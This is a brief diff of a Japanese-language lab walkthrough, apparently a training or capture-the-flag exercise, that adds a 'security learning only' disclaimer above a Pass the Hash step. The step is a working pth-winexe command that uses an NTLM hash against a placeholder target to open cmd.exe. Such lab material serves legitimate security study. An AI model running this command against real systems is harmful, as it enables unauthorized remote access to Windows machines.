@@ -32,6 +32,7 @@ whoami
 #### 【Task12】Pass the Hash攻撃を実行
 ```
 # Pass the Hash攻撃を実行する
+# ※セキュリティ学習目的以外に使用しないでください
 pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<targetIP> cmd.exe
 
 # ユーザを確認<br>
